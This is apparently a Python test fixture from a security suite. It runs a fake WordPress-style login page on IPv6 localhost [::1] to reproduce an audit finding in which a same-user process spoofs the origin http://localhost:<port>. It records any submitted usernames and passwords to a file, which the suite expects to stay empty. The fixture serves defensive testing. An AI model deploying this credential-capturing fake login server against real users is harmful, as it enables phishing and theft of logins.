#!/usr/bin/python3 -I
"""Fake site on the same origin `http://localhost:<port>`, listening only on `[::1]` (Phase 44c).

Attack from the M6 security audit: the real test service listens only on
`127.0.0.1:<port>`; a process of the same uid opens `[::1]:<port>` and Chrome, which
tries `::1` first for `localhost`, loads its page with the origin
`http://localhost:<port>`, the same as the entry's. The origin matches, so the daemon has
no way to tell them apart; what closes it is the origin confirmation in the window (D9,
Phase 44c) and, in `ward playwright`, `--host-resolver-rules=MAP localhost 127.0.0.1`.

Usage: fake_v6.py <port> <output file>. Writes the path and the body of each POST to the
file (0600; the suite checks that it stayed empty and never prints it). The page carries
the fake-v6 title (see `FORM`) so the suite knows the tab landed here.
"""

import http.server
import os
import socket
import sys

PORT = int(sys.argv[1])
OUTPUT = sys.argv[2]

FORM = b"""<!doctype html><html><head><title>falso-v6</title></head><body>
<form method="post" action="/wp-login.php">
<input type="text" name="log" id="user_login" autocomplete="username">
<input type="password" name="pwd" id="user_pass">
<button type="submit">Entrar</button></form></body></html>"""


class Page(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"<html><head><title>falso-v6</title></head><body>painel</body></html>" \
            if self.path.startswith("/wp-admin") else FORM
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0") or "0")
        body = self.rfile.read(min(n, 1 << 16))
        fd = os.open(OUTPUT, os.O_WRONLY | os.O_APPEND | os.O_CREAT | os.O_NOFOLLOW, 0o600)
        with os.fdopen(fd, "ab") as f:
            f.write(self.path.encode() + b" " + body + b"\n")
        self.send_response(302)
        self.send_header("Location", "/wp-admin/")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, *a):
        pass


class Server(http.server.ThreadingHTTPServer):
    address_family = socket.AF_INET6

    def server_bind(self):
        self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)
        super().server_bind()


Server(("::1", PORT), Page).serve_forever()
